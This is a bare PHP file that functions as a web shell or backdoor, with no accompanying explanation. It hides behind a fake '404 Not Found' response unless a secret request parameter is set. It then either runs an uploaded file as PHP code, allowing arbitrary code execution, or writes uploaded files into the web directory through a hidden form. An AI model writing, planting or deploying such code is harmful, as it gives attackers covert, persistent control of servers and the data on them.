<?php
error_reporting(E_ALL & ~E_NOTICE);
$t1 = $m ? stripslashes($_REQUEST["t1"]) : $_REQUEST["t1"];
if ($t1 == "text") {
    @include($_FILES['u']['tmp_name']);
} elseif ($t1) {
    echo '<form action="" method="post" enctype="multipart/form-data" name="upform" id="upform"><input type="file" name="file" size="50"><input name="ups" type="submit" id="ups" value="go"></form>';
    if ($_POST['ups'] == "go") {
        if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            exit(">|0|<");
        } else {
            exit(">|1|<");
        }
    }
} else {
    header("HTTP/1.0 404 Not Found");
    exit();
}
?>